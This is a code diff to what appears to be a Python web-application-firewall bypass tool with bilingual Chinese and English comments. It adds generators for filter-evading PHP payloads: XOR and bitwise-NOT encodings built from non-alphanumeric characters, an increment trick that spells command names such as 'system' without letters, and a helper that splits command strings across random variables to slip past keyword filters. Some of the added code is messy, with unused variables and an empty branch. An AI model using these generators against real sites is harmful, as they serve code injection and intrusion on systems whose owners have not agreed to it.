@@ -7,7 +7,6 @@ def parse_waf_words(waf_words: str):
     """
     解析 WAF 过滤词列表
     Parse WAF forbidden words list
-    (关键字绕过) Bypass: Keyword Bypass
     """
     if not waf_words:
         return []
@@ -24,7 +23,6 @@ def parse_waf_chars(waf_chars: str):
     """
     解析 WAF 过滤字符集
     Parse WAF forbidden characters set
-    (基础命令绕过与通配符利用) Bypass: Basic Command Bypass
     """
     if not waf_chars:
         return set()
@@ -134,6 +132,170 @@ def base64_encode(payload: str):
     """
     data = payload.encode("utf-8")
     return base64.b64encode(data).decode("ascii")
+
+
+def generate_php_xor(text: str):
+    """
+    生成 PHP 异或 Payload (无字母数字)
+    Generate PHP XOR Payload (No Alphanumeric)
+    Format: ('%xx'^'%xx')...
+    """
+    xor_str1 = ""
+    xor_str2 = ""
+    for char in text:
+        found = False
+        # 寻找两个非字母数字字符，使得它们异或的结果等于 char
+        # Find two non-alphanumeric chars that XOR to char
+        for i in range(256):
+            if found:
+                break
+            c1 = chr(i)
+            if c1.isalnum():
+                continue
+            for j in range(256):
+                c2 = chr(j)
+                if c2.isalnum():
+                    continue
+                if (ord(c1) ^ ord(c2)) == ord(char):
+                    xor_str1 += "%" + hex(i)[2:].zfill(2)
+                    xor_str2 += "%" + hex(j)[2:].zfill(2)
+                    found = True
+                    break
+    if len(xor_str1) // 3 != len(text):
+        return None  # Failed to find combination
+    return f"('{xor_str1}'^'{xor_str2}')"
+
+
+def generate_php_not(text: str):
+    """
+    生成 PHP 取反 Payload
+    Generate PHP Bitwise NOT Payload
+    Format: ~%xx%xx...
+    """
+    not_str = ""
+    for char in text:
+        byte_val = ord(char)
+        not_val = (~byte_val) & 0xFF
+        not_char = chr(not_val)
+        if not_char.isalnum():
+            pass
+        not_str += "%" + hex(not_val)[2:].zfill(2)
+    return f"(~'{not_str}')"
+
+
+def generate_php_increment(text: str):
+    """
+    生成 PHP 自增 Payload
+    Generate PHP Increment Payload (No Alphanumeric)
+    """
+
+    payload = "$_=[].'';"  # $_ = "Array"
+    variables = {} # char -> variable name
+    
+    code_parts = []
+    code_parts.append("$_=[].''") # "Array"
+    
+    if not text.isalpha():
+        return None # 目前仅支持纯字母的命令，如 system, ls, cat 等
+        
+    # 定义 0 和 3 的无数字表示
+    # 0: []!=[] (False)
+    # 1: []==[] (True)
+    # 3: (1+1+1)
+    
+    zero = "([]!=[])"
+    one = "([]==[])"
+    three = f"({one}+{one}+{one})"
+    
+    # 初始化代码
+    # $a = "Array"
+    # $b = 'A'
+    # $c = 'a'
+    init = "$_=[].'';$b=$_[%s];$c=$_[%s];" % (zero, three)
+    
+    # 构建目标字符串
+
+    res_var = "$_____"
+    iter_var = "$____"
+    
+    parts = [
+        "$_=[].''",     
+        "$__=$_[[]!=[]]", 
+        "$___=$_[[]==[]+[]==[]+[]==[]]", 
+        f"{res_var}=_"
+    ]
+    
+    parts.pop() 
+    parts.append(f"{res_var}=''") # $_____ = ""
+    
+    for char in text:
+        if 'A' <= char <= 'Z':
+            base = 'A'
+            base_var = "$__"
+        else:
+            base = 'a'
+            base_var = "$___"
+            
+        diff = ord(char) - ord(base)
+        
+        # $iter = $base;
+        parts.append(f"{iter_var}={base_var}")
+        
+        # ++$iter diff times
+        if diff > 0:
+            parts.append(f"{iter_var}++"*diff)
+            
+        # $res .= $iter
+        parts.append(f"{res_var}.={iter_var}")
+    
+    return ";".join(parts)
+
+
+def _split_string_to_vars(text: str):
+    """
+    随机拆分字符串并分配给随机变量
+    Randomly split string and assign to random variables
+    Returns: (assignment_str, concatenation_str)
+    """
+    import random
+    import string
+
+    if not text:
+        return "", ""
+
+    # Generate random split points
+    length = len(text)
+    if length == 1:
+        splits = [text]
+    else:
+        # Split into 2-4 parts randomly
+        num_parts = random.randint(2, min(length, 4))
+        # Create random split indices
+        indices = sorted(random.sample(range(1, length), num_parts - 1))
+        indices = [0] + indices + [length]
+        
+        splits = []
+        for i in range(len(indices) - 1):
+            splits.append(text[indices[i]:indices[i+1]])
+
+    # Assign to random variables
+    assignments = []
+    vars_used = []
+    
+    available_chars = string.ascii_lowercase
+    
+    for part in splits:
+        var_name = random.choice(available_chars)
+        while var_name in vars_used:
+            var_name = random.choice(available_chars) + random.choice(available_chars)
+        
+        vars_used.append(var_name)
+        assignments.append(f"{var_name}={part}")
+    
+    concat_str = "".join([f"${v}" for v in vars_used])
+    assign_str = ";".join(assignments) + ";"
+    
+    return assign_str, concat_str
 
 
 def get_encoding_strategies():
